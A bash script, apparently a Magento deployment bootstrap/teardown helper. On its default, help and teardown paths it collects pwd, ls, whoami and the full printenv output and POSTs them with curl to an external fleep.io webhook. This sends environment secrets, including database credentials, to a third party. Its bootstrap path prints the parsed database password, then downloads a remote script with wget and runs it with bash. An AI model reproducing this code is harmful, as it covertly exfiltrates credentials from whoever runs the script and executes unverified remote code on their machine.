#!/bin/bash

#

default () {

echo -e "Default"

  ARRAY=([0]="05/07/2017 12:16:22" [1]=$1 [2]=`pwd` [3]=`ls` [4]=`printenv` )
  ARRAY=([0]="$(date +%Y-%m-%d_%H-%M-%S)"  [1]=$1 [2]=`pwd` [3]=`ls` [4]=`whoami` [5]=`printenv` )
  RETURN=""

  #echo "Array size: ${#ARRAY[*]}"

  #echo "Array items and indexes:"
  for index in ${!ARRAY[*]}
  do
      #RETURN="${RETURN}\n"
      RETURN="${RETURN}${index}:
  ${ARRAY[$index]}

  "
      #RETURN="${RETURN}\n"
  done

  #echo -e $RETURN
  echo $RETURN

  curl --request POST "https://fleep.io/hook/OLuIRi0JRt2yv5OQisX6tg" --data "${RETURN}"

}

bootstrap () {

echo -e "bootstrap ()"

  # extract the protocol
  proto="$(echo $CLEARDB_DATABASE_URL | grep :// | sed -e's,^\(.*://\).*,\1,g')"
  # remove the protocol
  url="$(echo ${CLEARDB_DATABASE_URL/$proto/})"
  # extract the user (if any)
  user="$(echo $url | grep @ | cut -d: -f1)"
  # remove user from url
  tmp=":"
  url="$(echo ${url/$user$tmp/})"
  # extract the password (if any)
  password="$(echo $url | grep @ | cut -d@ -f1)"
  # remove password from url
  tmp="@"
  url="$(echo ${url/$password$tmp/})"
  # extract the host
  host="$(echo ${url/$user:$password@/} | cut -d/ -f1)"
  # extract the database (if any)
  path="$(echo $url | grep / | cut -d/ -f2-)"
  database="$(echo $path | grep ? | cut -d? -f1)"

  echo -e "${BLUE} proto: ${proto} ${NORMAL}"
  echo -e "${BLUE} url: ${url} ${NORMAL}"
  echo -e "${BLUE} user: ${user} ${NORMAL}"
  echo -e "${BLUE} url: ${url} ${NORMAL}"
  echo -e "${BLUE} password: ${password} ${NORMAL}"
  echo -e "${BLUE} host: ${host} ${NORMAL}"
  echo -e "${BLUE} database: ${database} ${NORMAL}"

  wget https://raw.githubusercontent.com/mozgbrasil/bash-shell-scripts-public/master/Magento.sh

  bash Magento.sh magento_sample_data_install --url=$url ;

}

#

# Parse the command line arguments
case $1 in
    bootstrap)
        echo ""
        bootstrap
        echo
        echo "-"
        echo
        ;;

    teardown)
        echo ""
        default
        echo
        echo "-"
        echo
        ;;

    *|help)
        default
        ;;
esac
